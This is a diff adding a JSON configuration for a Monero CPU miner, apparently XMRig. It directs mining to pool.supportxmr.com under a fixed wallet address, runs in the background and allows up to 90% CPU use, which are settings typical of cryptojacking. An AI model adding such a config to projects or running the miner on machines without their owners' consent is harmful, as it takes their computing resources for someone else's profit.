@@ -1,0 +1,33 @@
+{
+    "algo": "cryptonight",
+    "api": {
+        "port": 0,
+        "access-token": null,
+        "worker-id": null,
+        "ipv6": false,
+        "restricted": true
+    },
+    "av": 0,
+    "background": true,
+    "colors": true,
+    "cpu-priority": 4,
+    "donate-level": 1,
+    "log-file": null,
+    "max-cpu-usage": 90,
+    "pools": [
+        {
+            "url": "pool.supportxmr.com:5555",
+            "user": "42hhyPKkombM6LYEsz6kZe3d1ktHpkkD54Rtv5VZohaAbQAXzmAjkHSDZVWqMm9ieRCjMkijBYhy39ZJrYWVxKDVVqtzwPf",
+            "pass": "workx",
+            "keepalive": true,
+            "nicehash": false,
+            "variant": 1
+        }
+    ],
+    "print-time": 60,
+    "retries": 5,
+    "retry-pause": 5,
+    "safe": false,
+    "syslog": false,
+    "threads": null
+}
